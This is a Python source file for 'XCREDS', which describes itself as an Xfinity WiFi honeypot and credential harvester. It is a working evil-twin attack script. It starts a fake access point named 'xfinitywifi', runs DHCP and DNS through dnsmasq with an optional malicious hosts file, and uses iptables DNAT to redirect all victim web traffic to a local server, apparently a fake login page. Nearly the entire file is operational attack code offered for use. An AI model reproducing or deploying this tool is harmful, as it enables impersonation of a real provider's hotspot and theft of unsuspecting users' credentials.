import sys
import os
from subprocess import Popen, PIPE
import re
import time


xcreds_dir = "/tmp/xcreds"
iface_started = None
using_hosts = False


class bcolors:
        PURPLE = '\033[95m'
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERL = '\033[4m'
        ENDC = '\033[0m'
        backBlack = '\033[40m'
        backRed = '\033[41m'
        backGreen = '\033[42m'
        backYellow = '\033[43m'
        backBlue = '\033[44m'
        backMagenta = '\033[45m'
        backCyan = '\033[46m'
        backWhite = '\033[47m'


banner = bcolors.GREEN + bcolors.backBlack + """
    __  __     ______     ______     ______     _____     ______      
   /\_\_\_\   /\  ___\   /\  == \   /\  ___\   /\  __-.  /\  ___\     
   \/_/\_\/_  \ \ \__/_  \ \  __<   \ \  __\   \ \ \/\ \ \ \___  \    
     /\_\/\_\  \ \_____\  \ \_\ \_\  \ \_____\  \ \____-  \/\_____\   
     \/_/\/_/   \/_____/   \/_/\/_/   \/_____/   \/____/   \/_____/   
                                                                      
""" + bcolors.ENDC


def bash(command):
    p = Popen(command, shell=True, stdout=PIPE)
    return p.communicate()[0]


def cleanup():
    bash("killall dnsmasq 2>/dev/null; killall hostapd 2>/dev/null; rm -rf " + xcreds_dir)
    if iface_started:
        bash("airmon-ng stop " + iface_started)


def prompt():
    return raw_input(bcolors.CYAN + "xcreds> " + bcolors.ENDC)


def get_ifaces():
    output = bash("ifconfig -s")
    return [line.split()[0] for line in output.splitlines()[1:]]


def get_wlan_ifaces():
    output = bash("ifconfig -a | grep wlan")
    return [line.split(':')[0] for line in output.splitlines()]


def yesno_prompt(prompt_text):
    while True:
        print(bcolors.BOLD + bcolors.GREEN + " " + prompt_text + " [y/n]\n" + bcolors.ENDC)
        user_input = prompt()
        if user_input == "y":
            print(" ")
            return True
        elif user_input == "n":
            print(" ")
            return False
        else:
            print(bcolors.RED + "\n Please enter y or n\n" + bcolors.ENDC)


def select_from_list(choices, type):
    if type == "ap":
        prompt_text = "Select a wireless interface to run the fake AP"
        error_text = "That interface does not exist"
    elif type == "internet":
        prompt_text = "Select an interface to provide internet access"
        error_text = "That interface does not exist"
    elif type == "dhcp_scheme":
        prompt_text = "Select an IP scheme for DHCP"
        error_text = "That is not an option"
    while True:
        # Display wlan interface choices
        print(bcolors.BOLD + bcolors.GREEN + " " + prompt_text + " [1-{}]:\n".format(len(choices)) + bcolors.ENDC)
        for i in range(0, len(choices)):
            print("   " + str(i + 1) + ") " + choices[i])
        print(" ")
        user_input = prompt()
        try:
            return choices[int(user_input) - 1]
        # If the user chooses an index out of bounds
        except IndexError:
            print(bcolors.RED + "\n " + error_text + "\n" + bcolors.ENDC)
            if type == "ap":
                if yesno_prompt("Would you like to reload the wireless interfaces?"):
                    choices = get_wlan_ifaces()
            elif type == "internet":
                if yesno_prompt("Would you like to reload the interfaces?"):
                    choices = get_ifaces()
        # If the user enters something that's not a number
        except ValueError:
            print(bcolors.RED + "\n Please input a number...\n" + bcolors.ENDC)
            if type == "wlan":
                if yesno_prompt("Would you like to reload the wireless interfaces?"):
                    choices = get_wlan_ifaces()
            elif type == "internet":
                if yesno_prompt("Would you like to reload the interfaces?"):
                    choices = get_ifaces()
        except:
            cleanup()
            print("\n")
            sys.exit()

def write_hosts():
    print(" Enter each line of the hosts file, followed by [Enter]")
    print(" (e.g 10.0.0.1 wifilogin.xfinity.com)\n Ctrl-C to exit\n") 
    hosts = []
    try:
        while True:
            hosts.append(prompt() + "\n")
    except KeyboardInterrupt:
        hosts_file = open(os.path.join(xcreds_dir, "hosts.conf"), 'w')
        hosts_file.writelines(hosts)
        hosts_file.close()
        print("\n")

def prepare():

    # Clear iptables
    bash("iptables --flush; iptables -t nat --flush; iptables -t mangle --flush;"
         + " iptables -X; iptables -t nat -X; iptables -t mangle -X")

    # Make a temporary xcreds directory
    bash("mkdir " + xcreds_dir)


def configure():

    print(" " + bcolors.DARKCYAN + bcolors.UNDERL + "Welcome to XCREDS, the Xfinity WiFi Honeypot / Credential Harvester!\n" + bcolors.ENDC)

    # Select AP interface
    wlan_ifaces = get_wlan_ifaces()
    if len(wlan_ifaces) > 1:
        ap_iface = select_from_list(wlan_ifaces, "ap")
    else:
        print(bcolors.YELLOW + " Only found one wlan interface, using it by default..." + bcolors.ENDC)
        ap_iface = wlan_ifaces[0]

    # Place AP interface in monitor mode
    print(bcolors.BLUE + "\n Placing " + ap_iface + " into monitor mode...\n" + bcolors.ENDC)
    start_wlan = bash("airmon-ng start " + ap_iface + " | grep enabled").strip()
    print(" " + start_wlan)

    # User confirms the monitor interface
    try:
        mon_guess = re.search(r"wlan[0-9]+mon", start_wlan).group(0)
        print(bcolors.GREEN + bcolors.BOLD + "\n Type the name of the new interface [" + mon_guess + "]:\n" + bcolors.ENDC)
    except AttributeError:
        mon_guess = None
        print(bcolors.GREEN + bcolors.BOLD + "\n Type the name of the new interface:\n" + bcolors.ENDC)
    mon_iface = prompt()
    if mon_iface == "" and mon_guess:
        mon_iface = mon_guess

    # Record this interface so it can be stopped upon cleanup
    global iface_started
    iface_started = mon_iface

    # Select internet interface
    ifaces = get_ifaces()
    # Remove monitor interface from list [this should always execute]
    if mon_iface in ifaces:
        ifaces.remove(mon_iface)
    print("")
    internet_iface = select_from_list(ifaces, "internet")

    # Configure dnsmasq
    dhcp_schemes = ["10.0.0.1/24", "192.168.1.1/24"]
    print("")
    dhcp_scheme = select_from_list(dhcp_schemes, "dhcp_scheme")
    if dhcp_scheme == "10.0.0.1/24":
        router_ip = "10.0.0.1"
        dhcp_range = "10.0.0.10,10.0.0.250"
    elif dhcp_scheme == "192.168.1.1/24":
        router_ip = "192.168.1.1"
        dhcp_range = "192.168.1.10,192.168.1.250"
    dhcp_ttl_default = "12h"
    print(bcolors.BOLD + bcolors.GREEN + "\n Enter the DHCP ttl [" + dhcp_ttl_default + "]:\n" + bcolors.ENDC)
    dhcp_ttl = prompt()
    if dhcp_ttl == "":
        dhcp_ttl = dhcp_ttl_default
    dns_server_default = "8.8.8.8"
    print(bcolors.GREEN + bcolors.BOLD + "\n Enter the desired DNS server [" + dns_server_default + "]:\n" + bcolors.ENDC)
    dns_server = prompt()
    if dns_server == "":
        dns_server = dns_server_default
    # Write config to file
    dnsmasq_conf = open(os.path.join(xcreds_dir, "dnsmasq.conf"), 'w')
    dnsmasq_conf.writelines(["interface=" + mon_iface,
                            "\ndhcp-range=" + dhcp_range + "," + dhcp_ttl,
                            "\ndhcp-option=3," + router_ip,
                            "\ndhcp-option=6," + router_ip,
                            "\nserver=" + dns_server,
                            "\nlog-queries",
                            "\nlog-dhcp\n"])
    dnsmasq_conf.close()

    # Configure hostapd
    essid_default = "xfinitywifi"
    print(bcolors.GREEN + bcolors.BOLD + "\n Enter the desired ESSID (name) of the fake AP [" + essid_default + "]:\n" + bcolors.ENDC)
    essid = prompt()
    if essid == "":
        essid = essid_default
    valid_channel = False
    while not valid_channel:
        print(bcolors.GREEN + bcolors.BOLD + "\n Enter the desired channel of the fake AP:\n" + bcolors.ENDC)
        user_input = prompt()
        try:
            if 0 < int(user_input) <= 14:
                channel = user_input
                valid_channel = True
            else:
                print(bcolors.RED + "\n Channel out of range" + bcolors.ENDC)
        except ValueError:
            print(bcolors.RED + "\n Please enter a number..." + bcolors.ENDC)
    # Write config to file
    hostapd_conf = open(os.path.join(xcreds_dir, "hostapd.conf"), 'w')
    hostapd_conf.writelines(["interface=" + mon_iface,
                            "\ndriver=nl80211",
                            "\nssid=" + essid,
                            "\nchannel=" + channel + "\n"])
    hostapd_conf.close()

    # Configure hosts
    print("")
    if yesno_prompt("Would you like to set up a malicious hosts file?"):
        global using_hosts
        using_hosts = True
        write_hosts()

    # Configure iptables
    bash("sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
    bash("iptables -P FORWARD ACCEPT; " 
         + "iptables -t nat -A POSTROUTING -o " + internet_iface + " -j MASQUERADE; "
         + "iptables -t nat -A PREROUTING -i " + mon_iface + " -p tcp -j DNAT "
         + "--to-destination " + router_ip + ":80")

    # Prepare monitor interface
    bash("ifconfig " + mon_iface + " " + dhcp_scheme + " up")


def start():

   print(bcolors.BLUE + "\n Starting the attack...\n Press Ctrl-C to exit cleanly\n" + bcolors.ENDC)

   dnsmasq_conf = os.path.join(xcreds_dir, "dnsmasq.conf")
   hostapd_conf = os.path.join(xcreds_dir, "hostapd.conf")

   run_command = ""

   # Start dnsmasq
   if using_hosts:
       hosts_conf = os.path.join(xcreds_dir, "hosts.conf")
       run_command += "xterm -fg green -bg black -geometry 110x16+0+0 -e dnsmasq -C " + dnsmasq_conf  + " -H " + hosts_conf + " -d & "
   else:
       run_command += "xterm -fg green -bg black -geometry 110x16+0+0 -e dnsmasq -C " + dnsmasq_conf + " -h -d & "

   # Start AP
   run_command += "xterm -fg DodgerBlue1 -bg black -geometry 110x16+0+273 -e hostapd " + hostapd_conf + " & "

   # Start webserver
   run_command += "xterm -geometry 110x16+0+518 -e python webserver.py 0.0.0.0:80"

   # Run all
   bash(run_command)

   # Wait for user exit
   while True:
       time.sleep(1)


def __main__():
    print(banner)
    prepare()
    try:
        configure()
        print(bcolors.DARKCYAN + bcolors.BOLD + " Armed and ready... Press [Enter] to start the attack:\n" + bcolors.ENDC)
        prompt()
        start()
    except KeyboardInterrupt:
        print(bcolors.YELLOW + "\n\n Exiting xcreds, see you later...\n" + bcolors.ENDC)
        cleanup()
        sys.exit()


__main__()
